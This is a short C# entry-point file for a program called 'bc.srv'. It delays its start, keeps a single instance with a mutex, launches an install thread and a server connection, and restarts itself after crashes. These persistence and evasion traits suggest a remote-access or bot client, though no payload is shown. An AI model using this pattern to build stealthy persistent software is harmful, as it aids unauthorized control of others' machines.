using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using bc.srv.Class;

namespace bc.srv
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            CreateStClient.InitializeStClient();
            Thread.Sleep(SrvData.Instance.StartupDelay);
            
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            
            // todo init st_client
            SrvData.Instance.ServerVersion = "0.2.0";

            using (var mutex = new Mutex(false, SrvData.Instance.sMutex))
            {
                if (!mutex.WaitOne(0, false))
                    return;

                // manage installation
                var ins = new InstallClass();
                ins.StartInstallThread();

                // START SERVER
                var con = new Connection();
                con.StartServer();

                var randomDelay = new Random(DateTime.Now.Millisecond);
                while (true)
                {
                    Thread.Sleep(randomDelay.Next(1000,5000));
                }
            }

        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Restart();
        }

        public static void Restart()
        {
            // todo add delay to process start using extternal process cmd
            Process.Start(Assembly.GetExecutingAssembly().Location);
            Exit(1);
        }

        public static void Exit(int code)
        {
            Environment.Exit(code);
        }
    }
}